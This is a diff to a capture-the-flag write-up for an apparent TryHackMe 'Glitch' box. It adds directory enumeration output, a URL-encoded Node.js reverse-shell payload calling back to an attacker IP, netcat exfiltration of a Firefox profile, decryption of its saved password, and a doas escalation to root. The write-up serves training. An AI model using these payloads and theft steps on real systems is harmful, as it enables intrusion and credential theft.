@@ -138,10 +138,42 @@ now we open a real site lets check html
 ```
 cant find something intreresting, on site and in HTML start feroxbuster
 ```shell
-
+feroxbuster -u http://10.10.141.67/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,zip,tar,conf,inc -t 200 -s 200,204,301,302,403,304,303,500,501,502 -H "Cookie:this_is_not_real" 
 ```
 results:
 ```shell
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.141.67/
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 403, 304, 303, 500, 501, 502]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🤯  Header                │ Cookie: this_is_not_real
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, bak, zip, tar, conf, inc]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+301      GET       10l       16w      173c http://10.10.141.67/img => http://10.10.141.67/img/
+200      GET        1l        1w       36c http://10.10.141.67/api/access
+200      GET      387l     2378w   181068c http://10.10.141.67/img/glitch.jpg
+200      GET       32l       59w      724c http://10.10.141.67/
+301      GET       10l       16w      171c http://10.10.141.67/js => http://10.10.141.67/js/
+200      GET       32l       59w      724c http://10.10.141.67/secret
+200      GET       32l       59w      724c http://10.10.141.67/Secret
+[####################] - 33m  5954787/5954787 0s      found:7       errors:2620   
+[####################] - 33m  1984905/1984905 1011/s  http://10.10.141.67/ 
+[####################] - 33m  1984905/1984905 1010/s  http://10.10.141.67/img/ 
+[####################] - 33m  1984905/1984905 1011/s  http://10.10.141.67/js/        
 ```
 
 check /secret:
@@ -251,4 +283,83 @@ Set                     [Status: 200, Size: 56, Words: 7, Lines: 1, Duration: 18
 
 ```
 ![[Pasted image 20251023214912.png]]
-in caido we can see more, `vulnerability_exploited [object global]` ask chatgpt and its Node.js + Express and eval() we have JavaScript RCE on server, lets take a shell from js
+in caido we can see more, `vulnerability_exploited [object global]` ask chatgpt and its Node.js + Express and eval() we have JavaScript RCE on server, lets take a shell with Node.js
+use this encoded with URL command in cmd
+```shell
+require('child_process').execSync('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')
+```
+```base64
+require%28%27child_process%27%29.execSync%28%27bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.11.147.65%2F9001+0%3E%261%22%27%29
+```
+and we are here ![[Pasted image 20251023233438.png]]
+take our user flag
+![[Pasted image 20251023233519.png]]
+next step use `linpeas.sh`
+and find  ![[Pasted image 20251023234150.png]]
+lets check script conf
+```shell
+user@ubuntu:/tmp$ cat /usr/local/etc/doas.conf
+cat /usr/local/etc/doas.conf
+permit v0id as root
+```
+in conf we see what we must be a `v0id` to exec root script and be root,
+afer i find .firefox in /home/user and i think that in this dir i can find dump of firefox lets download a `firefox_decrupt.py`
+```shell
+git clone https://github.com/unode/firefox_decrypt.git
+```
+after archive our .firefox and send by netcat
+on target:
+```shell
+tar -cvf fr.tgz .firefox
+```
+on kali:
+```shell
+nc -lvnp <port> > fr.tgz
+```
+on target:
+```shell
+nc IP port , fr.tgz
+```
+on kali 
+```shell
+tar -xzf fr.tgz -c <path to extract>
+```
+and use our script
+```shell
+python3 /home/user/firefox_decrypt/firefox_decrypt.py  ./.firefox/b5w4643p.default-release
+```
+result
+```shell
+025-10-23 18:03:23,356 - WARNING - profile.ini not found in ./.firefox/b5w4643p.default-release
+2025-10-23 18:03:23,356 - WARNING - Continuing and assuming './.firefox/b5w4643p.default-release' is a profile location
+
+Website:   https://glitch.thm
+Username: 'v0id'
+Password: 'love_the_void'
+```
+use
+```shell
+user@ubuntu:~$ su v0id
+su v0id
+Password: love_the_void
+v0id@ubuntu:/home/user$ whoami
+whoami
+v0id
+```
+and take a root 
+```shell
+bash: -c: option requires an argument
+v0id@ubuntu:/home/user$ doas -u root bash -p
+doas -u root bash -p
+Password: love_the_void
+
+root@ubuntu:/home/user# cat /root/root.txt
+cat /root/root.txt
+THM{diamonds_break_our_aching_minds}
+
+```
+
+
+
+
+
